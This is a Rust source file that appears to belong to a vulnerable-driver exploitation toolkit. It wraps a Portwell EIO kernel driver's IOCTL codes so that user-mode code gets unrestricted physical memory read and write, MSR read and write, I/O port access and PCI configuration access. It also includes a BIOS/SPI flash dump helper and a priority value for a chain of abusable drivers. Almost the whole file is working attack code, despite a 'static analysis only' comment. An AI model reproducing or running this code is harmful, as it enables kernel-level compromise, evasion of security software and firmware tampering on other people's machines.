//! Portwell BIOS Flash Driver Backend
//!
//! Portwell EIO driver exploitation interface
//! Device: \\.\PORTWELL_0_1 (via DosDevices symlink)
//!
//! Capabilities:
//! - Physical memory read/write (MmMapIoSpace based)
//! - MSR read/write (RDMSR/WRMSR)
//! - I/O port read/write (byte/word/dword)
//! - PCI configuration space read/write
//!
//! STATIC ANALYSIS ONLY - Do not load the driver.

use std::io;
use std::mem;
use std::ptr;

// Windows FFI
#[cfg(windows)]
mod ffi {
    use std::ffi::c_void;

    pub type HANDLE = *mut c_void;
    pub type DWORD = u32;
    pub type BOOL = i32;
    pub type LPCWSTR = *const u16;

    pub const INVALID_HANDLE_VALUE: HANDLE = -1isize as HANDLE;
    pub const GENERIC_READ: DWORD = 0x80000000;
    pub const GENERIC_WRITE: DWORD = 0x40000000;
    pub const FILE_SHARE_READ: DWORD = 0x00000001;
    pub const FILE_SHARE_WRITE: DWORD = 0x00000002;
    pub const OPEN_EXISTING: DWORD = 3;
    pub const FILE_ATTRIBUTE_NORMAL: DWORD = 0x80;

    extern "system" {
        pub fn CreateFileW(
            lpFileName: LPCWSTR,
            dwDesiredAccess: DWORD,
            dwShareMode: DWORD,
            lpSecurityAttributes: *mut c_void,
            dwCreationDisposition: DWORD,
            dwFlagsAndAttributes: DWORD,
            hTemplateFile: HANDLE,
        ) -> HANDLE;

        pub fn DeviceIoControl(
            hDevice: HANDLE,
            dwIoControlCode: DWORD,
            lpInBuffer: *const c_void,
            nInBufferSize: DWORD,
            lpOutBuffer: *mut c_void,
            nOutBufferSize: DWORD,
            lpBytesReturned: *mut DWORD,
            lpOverlapped: *mut c_void,
        ) -> BOOL;

        pub fn CloseHandle(hObject: HANDLE) -> BOOL;
        pub fn GetLastError() -> DWORD;
    }
}

// =============================================================================
// IOCTL Codes
// =============================================================================

/// Physical memory read (MmMapIoSpace)
pub const IOCTL_PHYS_MEM_READ: u32 = 0xEA606450;

/// Physical memory write (MmMapIoSpace)
pub const IOCTL_PHYS_MEM_WRITE: u32 = 0xEA60A454;

/// Read Model-Specific Register (RDMSR)
pub const IOCTL_MSR_READ: u32 = 0xEA602408;

/// Write Model-Specific Register (WRMSR)
pub const IOCTL_MSR_WRITE: u32 = 0xEA60240C;

/// I/O Port Read BYTE (IN AL, DX)
pub const IOCTL_IO_PORT_READ_BYTE: u32 = 0xEA60A440;

/// I/O Port Read WORD (IN AX, DX)
pub const IOCTL_IO_PORT_READ_WORD: u32 = 0xEA60A444;

/// I/O Port Read DWORD (IN EAX, DX)
pub const IOCTL_IO_PORT_READ_DWORD: u32 = 0xEA60A460;

/// I/O Port Write BYTE (OUT DX, AL)
pub const IOCTL_IO_PORT_WRITE_BYTE: u32 = 0xEA60A464;

/// I/O Port Write WORD (OUT DX, AX)
pub const IOCTL_IO_PORT_WRITE_WORD: u32 = 0xEA60A468;

/// I/O Port Write DWORD (OUT DX, EAX)
pub const IOCTL_IO_PORT_WRITE_DWORD: u32 = 0xEA60A470;

/// PCI Configuration Space Read
pub const IOCTL_PCI_CONFIG_READ: u32 = 0xEA606458;

/// PCI Configuration Space Write
pub const IOCTL_PCI_CONFIG_WRITE: u32 = 0xEA60A45C;

// =============================================================================
// Input/Output Structures
// =============================================================================

/// Physical memory read/write input (16 bytes)
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct PhysMemInput {
    /// Target physical address (64-bit)
    pub physical_address: u64,
    /// Number of bytes to read/write
    pub size: u32,
    /// Reserved/padding
    pub _reserved: u32,
}

/// MSR read input (4 bytes)
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct MsrReadInput {
    /// MSR register index
    pub msr_index: u32,
}

/// MSR read output (8 bytes)
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct MsrReadOutput {
    /// 64-bit MSR value (EDX:EAX combined)
    pub value: u64,
}

/// MSR write input (12 bytes)
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct MsrWriteInput {
    /// MSR register index
    pub msr_index: u32,
    /// 64-bit value to write
    pub value: u64,
}

/// I/O port read input (4 bytes)
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct IoPortReadInput {
    /// I/O port number (0x0000-0xFFFF)
    pub port: u32,
}

/// I/O port write input (8 bytes)
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct IoPortWriteInput {
    /// I/O port number
    pub port: u32,
    /// Value to write (byte/word/dword depending on IOCTL)
    pub value: u32,
}

/// PCI config space input (12 bytes)
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct PciConfigInput {
    /// Bus number
    pub bus: u8,
    /// Device number (0-31)
    pub device: u8,
    /// Function number (0-7)
    pub function: u8,
    /// Reserved alignment byte
    pub _pad: u8,
    /// Register offset within configuration space
    pub offset: u32,
    /// Size of access in bytes (1, 2, or 4)
    pub access_size: u32,
}

/// PCI config write input (16 bytes)
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct PciConfigWriteInput {
    /// Bus number
    pub bus: u8,
    /// Device number (0-31)
    pub device: u8,
    /// Function number (0-7)
    pub function: u8,
    /// Reserved alignment byte
    pub _pad: u8,
    /// Register offset within configuration space
    pub offset: u32,
    /// Size of access in bytes (1, 2, or 4)
    pub access_size: u32,
    /// Value to write
    pub value: u32,
}

// =============================================================================
// Driver Handle
// =============================================================================

/// Handle to the Portwell EIO driver device
pub struct PortwellDriver {
    handle: ffi::HANDLE,
}

impl PortwellDriver {
    /// Device path for usermode access (DosDevices symlink)
    const DEVICE_PATH: &'static str = "\\\\.\\PORTWELL_0_1";

    /// Open a handle to the Portwell device.
    /// Requires the driver to already be loaded.
    pub fn open() -> io::Result<Self> {
        let wide_path: Vec<u16> = Self::DEVICE_PATH
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let handle = unsafe {
            ffi::CreateFileW(
                wide_path.as_ptr(),
                ffi::GENERIC_READ | ffi::GENERIC_WRITE,
                ffi::FILE_SHARE_READ | ffi::FILE_SHARE_WRITE,
                ptr::null_mut(),
                ffi::OPEN_EXISTING,
                ffi::FILE_ATTRIBUTE_NORMAL,
                ptr::null_mut(),
            )
        };

        if handle == ffi::INVALID_HANDLE_VALUE {
            return Err(io::Error::last_os_error());
        }

        Ok(Self { handle })
    }

    /// Send an IOCTL to the driver (generic helper)
    fn ioctl(
        &self,
        code: u32,
        input: *const u8,
        input_len: u32,
        output: *mut u8,
        output_len: u32,
    ) -> io::Result<u32> {
        let mut bytes_returned: u32 = 0;

        let result = unsafe {
            ffi::DeviceIoControl(
                self.handle,
                code,
                input as *const _,
                input_len,
                output as *mut _,
                output_len,
                &mut bytes_returned,
                ptr::null_mut(),
            )
        };

        if result == 0 {
            Err(io::Error::last_os_error())
        } else {
            Ok(bytes_returned)
        }
    }

    // =========================================================================
    // Physical Memory Operations
    // =========================================================================

    /// Read physical memory at the given address.
    /// Uses MmMapIoSpace internally - no address restrictions.
    pub fn read_physical_memory(&self, phys_addr: u64, buffer: &mut [u8]) -> io::Result<()> {
        if buffer.is_empty() {
            return Ok(());
        }

        let input = PhysMemInput {
            physical_address: phys_addr,
            size: buffer.len() as u32,
            _reserved: 0,
        };

        let bytes_returned = self.ioctl(
            IOCTL_PHYS_MEM_READ,
            &input as *const _ as *const u8,
            mem::size_of::<PhysMemInput>() as u32,
            buffer.as_mut_ptr(),
            buffer.len() as u32,
        )?;

        if bytes_returned as usize != buffer.len() {
            return Err(io::Error::new(
                io::ErrorKind::UnexpectedEof,
                format!(
                    "Expected {} bytes, got {}",
                    buffer.len(),
                    bytes_returned
                ),
            ));
        }

        Ok(())
    }

    /// Write physical memory at the given address.
    /// Uses MmMapIoSpace internally - no address restrictions.
    pub fn write_physical_memory(&self, phys_addr: u64, data: &[u8]) -> io::Result<()> {
        if data.is_empty() {
            return Ok(());
        }

        // Build input: 16-byte header + data payload
        let header_size = mem::size_of::<PhysMemInput>();
        let total_size = header_size + data.len();
        let mut input_buf = vec![0u8; total_size];

        let header = PhysMemInput {
            physical_address: phys_addr,
            size: data.len() as u32,
            _reserved: 0,
        };
        unsafe {
            ptr::copy_nonoverlapping(
                &header as *const _ as *const u8,
                input_buf.as_mut_ptr(),
                header_size,
            );
        }

        // Copy data payload after header
        input_buf[header_size..].copy_from_slice(data);

        self.ioctl(
            IOCTL_PHYS_MEM_WRITE,
            input_buf.as_ptr(),
            total_size as u32,
            ptr::null_mut(),
            0,
        )?;

        Ok(())
    }

    /// Read a u32 from physical memory
    pub fn read_phys_u32(&self, phys_addr: u64) -> io::Result<u32> {
        let mut buf = [0u8; 4];
        self.read_physical_memory(phys_addr, &mut buf)?;
        Ok(u32::from_le_bytes(buf))
    }

    /// Read a u64 from physical memory
    pub fn read_phys_u64(&self, phys_addr: u64) -> io::Result<u64> {
        let mut buf = [0u8; 8];
        self.read_physical_memory(phys_addr, &mut buf)?;
        Ok(u64::from_le_bytes(buf))
    }

    /// Write a u32 to physical memory
    pub fn write_phys_u32(&self, phys_addr: u64, value: u32) -> io::Result<()> {
        self.write_physical_memory(phys_addr, &value.to_le_bytes())
    }

    /// Write a u64 to physical memory
    pub fn write_phys_u64(&self, phys_addr: u64, value: u64) -> io::Result<()> {
        self.write_physical_memory(phys_addr, &value.to_le_bytes())
    }

    // =========================================================================
    // MSR Operations
    // =========================================================================

    /// Read a Model-Specific Register. No index validation - any MSR accessible.
    pub fn read_msr(&self, msr_index: u32) -> io::Result<u64> {
        let input = MsrReadInput { msr_index };
        let mut output = MsrReadOutput { value: 0 };

        self.ioctl(
            IOCTL_MSR_READ,
            &input as *const _ as *const u8,
            mem::size_of::<MsrReadInput>() as u32,
            &mut output as *mut _ as *mut u8,
            mem::size_of::<MsrReadOutput>() as u32,
        )?;

        Ok(output.value)
    }

    /// Write a Model-Specific Register. No index validation.
    pub fn write_msr(&self, msr_index: u32, value: u64) -> io::Result<()> {
        let input = MsrWriteInput { msr_index, value };

        self.ioctl(
            IOCTL_MSR_WRITE,
            &input as *const _ as *const u8,
            mem::size_of::<MsrWriteInput>() as u32,
            ptr::null_mut(),
            0,
        )?;

        Ok(())
    }

    // =========================================================================
    // I/O Port Operations
    // =========================================================================

    /// Read a byte from an I/O port
    pub fn io_port_read_byte(&self, port: u16) -> io::Result<u8> {
        let input = IoPortReadInput { port: port as u32 };
        let mut output: u32 = 0;

        self.ioctl(
            IOCTL_IO_PORT_READ_BYTE,
            &input as *const _ as *const u8,
            mem::size_of::<IoPortReadInput>() as u32,
            &mut output as *mut _ as *mut u8,
            4,
        )?;

        Ok(output as u8)
    }

    /// Read a word from an I/O port
    pub fn io_port_read_word(&self, port: u16) -> io::Result<u16> {
        let input = IoPortReadInput { port: port as u32 };
        let mut output: u32 = 0;

        self.ioctl(
            IOCTL_IO_PORT_READ_WORD,
            &input as *const _ as *const u8,
            mem::size_of::<IoPortReadInput>() as u32,
            &mut output as *mut _ as *mut u8,
            4,
        )?;

        Ok(output as u16)
    }

    /// Read a dword from an I/O port
    pub fn io_port_read_dword(&self, port: u16) -> io::Result<u32> {
        let input = IoPortReadInput { port: port as u32 };
        let mut output: u32 = 0;

        self.ioctl(
            IOCTL_IO_PORT_READ_DWORD,
            &input as *const _ as *const u8,
            mem::size_of::<IoPortReadInput>() as u32,
            &mut output as *mut _ as *mut u8,
            4,
        )?;

        Ok(output)
    }

    /// Write a byte to an I/O port
    pub fn io_port_write_byte(&self, port: u16, value: u8) -> io::Result<()> {
        let input = IoPortWriteInput {
            port: port as u32,
            value: value as u32,
        };

        self.ioctl(
            IOCTL_IO_PORT_WRITE_BYTE,
            &input as *const _ as *const u8,
            mem::size_of::<IoPortWriteInput>() as u32,
            ptr::null_mut(),
            0,
        )?;

        Ok(())
    }

    /// Write a word to an I/O port
    pub fn io_port_write_word(&self, port: u16, value: u16) -> io::Result<()> {
        let input = IoPortWriteInput {
            port: port as u32,
            value: value as u32,
        };

        self.ioctl(
            IOCTL_IO_PORT_WRITE_WORD,
            &input as *const _ as *const u8,
            mem::size_of::<IoPortWriteInput>() as u32,
            ptr::null_mut(),
            0,
        )?;

        Ok(())
    }

    /// Write a dword to an I/O port
    pub fn io_port_write_dword(&self, port: u16, value: u32) -> io::Result<()> {
        let input = IoPortWriteInput {
            port: port as u32,
            value,
        };

        self.ioctl(
            IOCTL_IO_PORT_WRITE_DWORD,
            &input as *const _ as *const u8,
            mem::size_of::<IoPortWriteInput>() as u32,
            ptr::null_mut(),
            0,
        )?;

        Ok(())
    }

    // =========================================================================
    // PCI Configuration Space
    // =========================================================================

    /// Read from PCI configuration space.
    /// access_size: 1 = byte, 2 = word, 4 = dword
    pub fn pci_config_read(
        &self,
        bus: u8,
        device: u8,
        function: u8,
        offset: u32,
        access_size: u32,
    ) -> io::Result<u32> {
        let input = PciConfigInput {
            bus,
            device: device & 0x1F,
            function: function & 0x07,
            _pad: 0,
            offset,
            access_size,
        };

        let mut output: u32 = 0;

        self.ioctl(
            IOCTL_PCI_CONFIG_READ,
            &input as *const _ as *const u8,
            mem::size_of::<PciConfigInput>() as u32,
            &mut output as *mut _ as *mut u8,
            4,
        )?;

        Ok(output)
    }

    /// Write to PCI configuration space.
    /// access_size: 1 = byte, 2 = word, 4 = dword
    pub fn pci_config_write(
        &self,
        bus: u8,
        device: u8,
        function: u8,
        offset: u32,
        access_size: u32,
        value: u32,
    ) -> io::Result<()> {
        let input = PciConfigWriteInput {
            bus,
            device: device & 0x1F,
            function: function & 0x07,
            _pad: 0,
            offset,
            access_size,
            value,
        };

        self.ioctl(
            IOCTL_PCI_CONFIG_WRITE,
            &input as *const _ as *const u8,
            mem::size_of::<PciConfigWriteInput>() as u32,
            ptr::null_mut(),
            0,
        )?;

        Ok(())
    }

    /// Read a full 256-byte PCI configuration header
    pub fn pci_read_config_header(
        &self,
        bus: u8,
        device: u8,
        function: u8,
    ) -> io::Result<[u8; 256]> {
        let mut header = [0u8; 256];

        for offset in (0..256u32).step_by(4) {
            let value = self.pci_config_read(bus, device, function, offset, 4)?;
            let bytes = value.to_le_bytes();
            header[offset as usize..offset as usize + 4].copy_from_slice(&bytes);
        }

        Ok(header)
    }

    // =========================================================================
    // High-Level Helpers
    // =========================================================================

    /// Read BIOS/UEFI region from SPI flash mapped area (typically 0xFF000000+)
    pub fn read_spi_flash_region(
        &self,
        base: u64,
        size: usize,
    ) -> io::Result<Vec<u8>> {
        const CHUNK_SIZE: usize = 4096;
        let mut result = Vec::with_capacity(size);
        let mut offset = 0u64;

        while (offset as usize) < size {
            let read_size = CHUNK_SIZE.min(size - offset as usize);
            let mut chunk = vec![0u8; read_size];

            self.read_physical_memory(base + offset, &mut chunk)?;
            result.extend_from_slice(&chunk);
            offset += read_size as u64;
        }

        Ok(result)
    }

    /// Enumerate PCI devices on a given bus
    pub fn pci_enumerate_bus(&self, bus: u8) -> io::Result<Vec<(u8, u8, u16, u16)>> {
        let mut devices = Vec::new();

        for device in 0..32u8 {
            for function in 0..8u8 {
                let vendor_id = self.pci_config_read(bus, device, function, 0, 2)?;
                if vendor_id == 0xFFFF || vendor_id == 0 {
                    if function == 0 {
                        break; // No device at this slot
                    }
                    continue;
                }
                let device_id = self.pci_config_read(bus, device, function, 2, 2)?;
                devices.push((device, function, vendor_id as u16, device_id as u16));

                // Check if multi-function device
                if function == 0 {
                    let header_type = self.pci_config_read(bus, device, 0, 0x0E, 1)?;
                    if header_type & 0x80 == 0 {
                        break; // Single-function device
                    }
                }
            }
        }

        Ok(devices)
    }

    /// Check if the driver is responsive by attempting a benign read
    pub fn probe(&self) -> bool {
        // Try reading the BIOS data area (always mapped)
        let mut buf = [0u8; 4];
        self.read_physical_memory(0x0000_0400, &mut buf).is_ok()
    }
}

impl Drop for PortwellDriver {
    fn drop(&mut self) {
        if self.handle != ffi::INVALID_HANDLE_VALUE {
            unsafe {
                ffi::CloseHandle(self.handle);
            }
            self.handle = ffi::INVALID_HANDLE_VALUE;
        }
    }
}

// Safety: The handle is only used via DeviceIoControl which is thread-safe
unsafe impl Send for PortwellDriver {}

// =============================================================================
// Integration with driver chain
// =============================================================================

/// Driver info for the driver chain priority system
pub struct PortwellInfo;

impl PortwellInfo {
    pub const DRIVER_FILE: &'static str = "portwell.sys";
    pub const DEVICE_PATH: &'static str = "\\\\.\\PORTWELL_0_1";
    pub const SERVICE_NAME: &'static str = "PORTWELL";
    pub const REGISTRY_PATH: &'static str =
        "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\PORTWELL";

    /// DosDevices symlink name used during driver registration
    pub const DOS_DEVICE_LINK: &'static str = "\\DosDevices\\PORTWELL_0_1";

    /// Check if driver is already loaded by attempting to open the device
    pub fn is_loaded() -> bool {
        PortwellDriver::open().map(|d| d.probe()).unwrap_or(false)
    }

    /// Priority in driver chain (lower = preferred)
    /// Full capabilities: phys mem, MSR, port I/O, PCI
    pub const CHAIN_PRIORITY: u32 = 2;
}

// =============================================================================
// Tests (compile-time only, do not run without driver loaded)
// =============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_struct_sizes() {
        assert_eq!(mem::size_of::<PhysMemInput>(), 16);
        assert_eq!(mem::size_of::<MsrReadInput>(), 4);
        assert_eq!(mem::size_of::<MsrReadOutput>(), 8);
        assert_eq!(mem::size_of::<MsrWriteInput>(), 12);
        assert_eq!(mem::size_of::<IoPortReadInput>(), 4);
        assert_eq!(mem::size_of::<IoPortWriteInput>(), 8);
        assert_eq!(mem::size_of::<PciConfigInput>(), 12);
        assert_eq!(mem::size_of::<PciConfigWriteInput>(), 16);
    }

    #[test]
    fn test_ioctl_codes() {
        // All IOCTLs share device type 0xEA60
        assert_eq!(IOCTL_PHYS_MEM_READ >> 16, 0xEA60);
        assert_eq!(IOCTL_PHYS_MEM_WRITE >> 16, 0xEA60);
        assert_eq!(IOCTL_MSR_READ >> 16, 0xEA60);
        assert_eq!(IOCTL_MSR_WRITE >> 16, 0xEA60);
        assert_eq!(IOCTL_IO_PORT_READ_BYTE >> 16, 0xEA60);
        assert_eq!(IOCTL_IO_PORT_READ_WORD >> 16, 0xEA60);
        assert_eq!(IOCTL_IO_PORT_READ_DWORD >> 16, 0xEA60);
        assert_eq!(IOCTL_IO_PORT_WRITE_BYTE >> 16, 0xEA60);
        assert_eq!(IOCTL_IO_PORT_WRITE_WORD >> 16, 0xEA60);
        assert_eq!(IOCTL_IO_PORT_WRITE_DWORD >> 16, 0xEA60);
        assert_eq!(IOCTL_PCI_CONFIG_READ >> 16, 0xEA60);
        assert_eq!(IOCTL_PCI_CONFIG_WRITE >> 16, 0xEA60);
    }

    #[test]
    fn test_ioctl_method_codes() {
        // Verify read IOCTLs use METHOD_BUFFERED with read access
        // Function codes extracted from IOCTL definitions
        assert_ne!(IOCTL_PHYS_MEM_READ, IOCTL_PHYS_MEM_WRITE);
        assert_ne!(IOCTL_MSR_READ, IOCTL_MSR_WRITE);
        assert_ne!(IOCTL_PCI_CONFIG_READ, IOCTL_PCI_CONFIG_WRITE);
    }

    #[test]
    fn test_device_function_bounds() {
        // Device max 31 (5 bits), function max 7 (3 bits)
        let input = PciConfigInput {
            bus: 255,
            device: 0xFF & 0x1F, // Masked to 31
            function: 0xFF & 0x07, // Masked to 7
            _pad: 0,
            offset: 0,
            access_size: 4,
        };
        assert_eq!(input.device, 31);
        assert_eq!(input.function, 7);
    }
}
